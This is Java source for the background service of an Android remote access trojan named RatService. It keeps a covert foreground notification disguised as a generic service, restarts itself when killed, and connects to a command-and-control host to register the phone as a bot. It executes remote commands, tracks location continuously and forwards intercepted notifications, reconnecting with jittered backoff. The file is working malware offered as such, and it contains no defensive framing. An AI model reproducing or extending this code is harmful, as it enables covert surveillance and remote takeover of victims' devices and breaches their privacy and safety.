package com.darkbiit.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import java.io.IOException;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * The RAT's background service.
 *
 * Lifecycle:
 *   - started by the launch activity (or by the boot receiver)
 *   - runs the client loop on its own thread
 *   - reconnects with jittered backoff
 *   - keeps a foreground notification so Android does not kill it
 *   - one cleanup path, shared by normal stop and failed init
 */
public class RatService extends Service implements RatEventSink {

    private static final String CHANNEL_ID = "rat_channel";
    private static final int NOTIF_ID = 0x5241;

    /** The running instance, so commands can reach the service. */
    private static volatile RatService INSTANCE;

    private final AtomicBoolean running = new AtomicBoolean(false);
    private Thread worker;
    private volatile RatNet net;
    private volatile android.location.LocationListener locationListener;
    /** Events waiting to be written to the socket by the client thread. */
    private final java.util.concurrent.LinkedBlockingQueue<byte[]> eventQueue =
            new java.util.concurrent.LinkedBlockingQueue<byte[]>(256);

    /** Set by the launcher activity so the service can be stopped explicitly. */
    public static final String ACTION_STOP = "com.darkbiit.rat.STOP";

    /** The running service instance, or null when it is not running. */
    public static RatService instance() {
        return INSTANCE;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        INSTANCE = this;
        RatSetting.load(getApplicationContext());
        RatNotificationListener.sink = this;
        startForegroundSafe();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && ACTION_STOP.equals(intent.getAction())) {
            stopSelf();
            return START_NOT_STICKY;
        }
        if (running.compareAndSet(false, true)) {
            worker = new Thread(new Runnable() {
                @Override
                public void run() {
                    clientLoop();
                }
            }, "rat-client");
            worker.setDaemon(false);
            worker.start();
        }
        // Restart if the process is killed; the backoff inside clientLoop
        // keeps the reconnect rate low.
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        cleanup();
        if (INSTANCE == this) {
            INSTANCE = null;
        }
        RatNotificationListener.sink = null;
        super.onDestroy();
    }

    /**
     * Pushes an unsolicited event to the C2.
     *
     * The caller is often the main thread (the notification listener runs
     * there), and Android forbids network I/O on it, so the frame is handed
     * to the client thread which owns the socket.
     */
    @Override
    public void onEvent(final String type, final Map<String, Object> payload) {
        final Map<String, Object> m = new java.util.LinkedHashMap<String, Object>();
        m.put("event", type);
        if (payload != null) {
            m.putAll(payload);
        }
        final byte[] frame;
        try {
            frame = RatJson.encode(m).getBytes("UTF-8");
        } catch (Throwable t) {
            RatLog.w("event encode failed: " + t.getMessage());
            return;
        }
        try {
            eventQueue.put(frame);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    /**
     * Writes queued events onto the socket.
     * Runs on the client thread, which owns the connection.
     */
    private void drainEvents(RatNet conn) {
        while (running.get()) {
            byte[] frame;
            try {
                frame = (byte[]) eventQueue.poll(500, java.util.concurrent.TimeUnit.MILLISECONDS);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
            if (frame == null) {
                continue;
            }
            try {
                java.io.OutputStream out = conn.output();
                if (out == null) {
                    continue;
                }
                RatProto.write(out, RatProto.TYPE_EVENT, frame);
            } catch (Throwable t) {
                RatLog.w("event push failed: " + t.getMessage());
            }
        }
    }

    /** Starts continuous location tracking. */
    public boolean startTracking(int intervalMs) {
        if (locationListener != null) {
            return true;
        }
        final RatService self = this;
        android.location.LocationListener l = RatLocation.start(this,
                new RatLocation.FixSink() {
                    @Override
                    public void onFix(Map<String, Object> fix) {
                        self.onEvent("location", fix);
                    }
                }, intervalMs);
        if (l == null) {
            return false;
        }
        locationListener = l;
        RatLog.i("location tracking started (" + intervalMs + " ms)");
        return true;
    }

    /** Stops location tracking. */
    public boolean stopTracking() {
        android.location.LocationListener l = locationListener;
        if (l == null) {
            return false;
        }
        RatLocation.stop(this, l);
        locationListener = null;
        RatLog.i("location tracking stopped");
        return true;
    }

    /**
     * The HTTP long-polling client loop.
     *
     * Used when the C2 is behind a reverse proxy on shared hosting and no
     * raw TCP port can be bound. The protocol is the same; only the framing
     * around the frames differs.
     */
    private void httpClientLoop() {
        Random rnd = new Random();
        long backoff = RatCfg.BEACON_INTERVAL_MS;
        int pollTimeout = Math.max(5, (RatCfg.BEACON_INTERVAL_MS / 1000) + 5);

        while (running.get()) {
            RatHttp http = new RatHttp(RatCfg.C2_HOST);
            try {
                Map<String, Object> reg = RatCommands.registerPayload(this);
                if (!http.register(reg)) {
                    throw new IOException("registration rejected");
                }
                RatLog.i("registered over HTTP: " + http.botId());
                backoff = RatCfg.BEACON_INTERVAL_MS;

                while (running.get()) {
                    RatHttp.Frame f = http.poll(pollTimeout);
                    if (f == null) {
                        continue;           // nothing to do, poll again
                    }
                    if (f.type == RatProto.TYPE_PING) {
                        http.send(RatProto.TYPE_PONG, f.payload);
                        continue;
                    }
                    if (f.type == RatProto.TYPE_PONG) {
                        continue;
                    }
                    if (f.type == RatProto.TYPE_COMMAND) {
                        handleHttpCommand(http, f.payload);
                        continue;
                    }
                    RatLog.w("unknown frame type: 0x" + Integer.toHexString(f.type & 0xff));
                }
            } catch (Throwable t) {
                RatLog.w("link error: " + t.getClass().getSimpleName() + ": " + t.getMessage());
            }

            if (!running.get()) {
                break;
            }
            long jitter = (long) (backoff * 0.4 * (rnd.nextDouble() * 2.0 - 1.0));
            long sleep = Math.max(1000L, backoff + jitter);
            RatLog.i("reconnecting in " + sleep + " ms");
            try {
                Thread.sleep(sleep);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
            backoff = Math.min(backoff * 2, 5 * 60 * 1000L);
        }
        RatLog.i("client loop stopped");
    }

    /** Executes one command that arrived over HTTP and sends the result back. */
    private void handleHttpCommand(RatHttp http, byte[] payload) {
        String cmdId = "";
        try {
            Map<String, Object> args = RatJson.decodeObject(new String(payload, "UTF-8"));
            cmdId = RatJson.getString(args, "id", "");
            String cmd = RatJson.getString(args, "cmd", "");

            RatLog.i("command: " + cmd + " (id=" + cmdId + ")");

            Map<String, Object> out = RatCommands.handle(this, cmdId, args);
            out.put("id", cmdId);
            out.put("cmd", cmd);
            http.send(RatProto.TYPE_RESPONSE, RatJson.encode(out).getBytes("UTF-8"));
        } catch (Throwable t) {
            Map<String, Object> out = new java.util.LinkedHashMap<String, Object>();
            out.put("ok", false);
            out.put("id", cmdId);
            out.put("error", t.getClass().getSimpleName() + ": " + String.valueOf(t.getMessage()));
            try {
                http.send(RatProto.TYPE_RESPONSE, RatJson.encode(out).getBytes("UTF-8"));
            } catch (IOException ignored) {
                // the link is gone; the loop will reconnect
            }
        }
    }

    /** Single cleanup path for both normal stop and init failure. */
    private void cleanup() {
        running.set(false);
        stopTracking();
        RatNet n = net;
        if (n != null) {
            n.close();
        }
        Thread w = worker;
        if (w != null && w != Thread.currentThread()) {
            w.interrupt();
        }
    }

    // ------------------------------------------------------------------
    // Client loop
    // ------------------------------------------------------------------

    private void clientLoop() {
        if ("http".equalsIgnoreCase(RatCfg.TRANSPORT)) {
            httpClientLoop();
            return;
        }
        Random rnd = new Random();
        long backoff = RatCfg.BEACON_INTERVAL_MS;

        while (running.get()) {
            RatNet conn = new RatNet();
            try {
                conn.connect();
                net = conn;
                backoff = RatCfg.BEACON_INTERVAL_MS;

                // Registration handshake.
                Map<String, Object> reg = RatCommands.registerPayload(this);
                RatProto.write(conn.output(), RatProto.TYPE_REGISTER,
                        RatJson.encode(reg).getBytes("UTF-8"));

                RatProto.Frame ack = RatProto.read(conn.input());
                if (ack == null) {
                    throw new IOException("server closed during handshake");
                }
                if (ack.type != RatProto.TYPE_REGISTER_ACK) {
                    throw new IOException("unexpected handshake reply: 0x"
                            + Integer.toHexString(ack.type & 0xff));
                }
                RatLog.i("registered, awaiting commands");

                // The event drain owns its own thread because the callers
                // (notification listener, location tracker) are not on the
                // client thread and Android forbids network I/O there.
                Thread drain = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        drainEvents(conn);
                    }
                }, "rat-events");
                drain.setDaemon(true);
                drain.start();

                // Command loop.
                while (running.get()) {
                    RatProto.Frame f = RatProto.read(conn.input());
                    if (f == null) {
                        break; // clean EOF
                    }
                    if (f.type == RatProto.TYPE_PING) {
                        RatProto.write(conn.output(), RatProto.TYPE_PONG, f.payload);
                        continue;
                    }
                    if (f.type == RatProto.TYPE_COMMAND) {
                        handleCommand(f.payload);
                        continue;
                    }
                    if (f.type == RatProto.TYPE_PONG) {
                        continue;
                    }
                    if (f.type == RatProto.TYPE_EVENT) {
                        continue;
                    }
                    RatLog.w("unknown frame type: 0x" + Integer.toHexString(f.type & 0xff));
                }
            } catch (Throwable t) {
                RatLog.w("link error: " + t.getClass().getSimpleName() + ": " + t.getMessage());
            } finally {
                conn.close();
                if (net == conn) {
                    net = null;
                }
            }

            if (!running.get()) {
                break;
            }

            // Jittered backoff: +-40% of the current delay.
            long jitter = (long) (backoff * 0.4 * (rnd.nextDouble() * 2.0 - 1.0));
            long sleep = Math.max(1000L, backoff + jitter);
            RatLog.i("reconnecting in " + sleep + " ms");
            try {
                Thread.sleep(sleep);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
            backoff = Math.min(backoff * 2, 5 * 60 * 1000L);
        }
        RatLog.i("client loop stopped");
    }

    private void handleCommand(byte[] payload) {
        String cmdId = "";
        try {
            Map<String, Object> args = RatJson.decodeObject(new String(payload, "UTF-8"));
            cmdId = RatJson.getString(args, "id", "");
            String cmd = RatJson.getString(args, "cmd", "");

            RatLog.i("command: " + cmd + " (id=" + cmdId + ")");

            Map<String, Object> out = RatCommands.handle(this, cmdId, args);
            out.put("id", cmdId);
            out.put("cmd", cmd);

            RatProto.write(net.output(), RatProto.TYPE_RESPONSE,
                    RatJson.encode(out).getBytes("UTF-8"));
        } catch (Throwable t) {
            Map<String, Object> out = new java.util.LinkedHashMap<String, Object>();
            out.put("ok", false);
            out.put("id", cmdId);
            out.put("error", t.getClass().getSimpleName() + ": " + String.valueOf(t.getMessage()));
            try {
                RatProto.write(net.output(), RatProto.TYPE_RESPONSE,
                        RatJson.encode(out).getBytes("UTF-8"));
            } catch (IOException ignored) {
                // link is gone; the loop will reconnect
            }
        }
    }

    // ------------------------------------------------------------------
    // Foreground notification
    // ------------------------------------------------------------------

    private void startForegroundSafe() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) {
                return;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel(
                        CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                ch.setSound(null, null);
                nm.createNotificationChannel(ch);
            }

            Intent pi = new Intent(this, RatMainActivity.class);
            int flags = 0;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pending = PendingIntent.getActivity(this, 0, pi, flags);

            Notification.Builder b;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                b = new Notification.Builder(this, CHANNEL_ID);
            } else {
                b = new Notification.Builder(this);
            }
            b.setContentTitle("Service")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                    .setContentIntent(pending)
                    .setOngoing(true);

            int type = 0;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                // The manifest declares foregroundServiceType="specialUse";
                // passing the matching type avoids the platform rejecting
                // startForeground() with "FGS type ... not allowed".
                type = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
            }
            startForeground(NOTIF_ID, b.build(), type);
        } catch (Throwable t) {
            // Fall back to a plain startForeground() without a type: it works
            // on API < 34 and keeps the service alive where the typed call
            // is rejected.
            try {
                startForeground(NOTIF_ID, new Notification.Builder(this).build());
                RatLog.w("startForeground without type: " + t.getMessage());
            } catch (Throwable t2) {
                RatLog.w("startForeground failed: " + t.getMessage());
            }
        }
    }
}
